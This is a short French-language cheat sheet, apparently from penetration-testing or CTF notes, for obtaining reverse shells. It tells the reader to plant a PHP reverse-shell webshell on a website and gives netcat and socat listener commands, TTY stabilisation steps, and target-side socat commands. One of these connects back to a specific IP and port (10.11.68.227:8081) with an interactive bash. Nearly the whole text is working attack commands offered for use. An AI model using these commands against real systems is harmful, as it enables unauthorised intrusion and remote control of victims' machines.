# Cheat Sheet Reverse Shell

## WebShell

Copier puis modifier /usr/share/webshells/php/php-reverse-shell.php

`$ip = '<IP ATTAQUANT>';`  
`$port = <PORT>;`

Puis upload sur le site et accéder au fichier

## Netcat Reverse Shell

**Attaquant**  
`nc -lvnp <PORT>`

**Stabilisation**  
`python3 -c 'import pty;pty.spawn("/bin/bash")'`	(ou python/python2/python3)  
`export TERM=xterm`  
`CTRL+Z`  
`stty raw -echo; fg`

## Socat Basic Reverse Shell

**Attaquant**  
`socat TCP-L:<PORT> EXEC:"bash -li"`

**Cible**  
`socat TCP:<IP ATTAQUANT>:<PORT> EXEC:"bash -li"`

## Socat Extended Reverse Shell

`socat TCP:10.11.68.227:8081 EXEC:"bash -li",pty,stderr,sigint,setsid,sane`